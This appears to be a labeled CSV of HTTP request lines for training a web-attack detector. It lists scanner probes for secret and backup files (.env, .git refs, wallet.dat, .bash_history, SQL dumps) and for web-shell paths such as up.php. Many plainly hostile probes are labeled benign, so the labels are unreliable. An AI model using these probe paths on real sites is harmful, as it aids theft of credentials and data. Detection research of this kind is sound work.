text,label
METHOD=HEAD PATH=/old/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/Datasets Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/back/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.git/info/refs QUERY=service=git-upload-pack PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,benign
METHOD=HEAD PATH=/restore/backup.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/data/admin/allowurl.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/old/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/ftpsync.settings QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/archive.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/www.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/mysql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/old/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/backup.sql.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/BlockCypher.log QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/honeypot/BSidesDFW - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
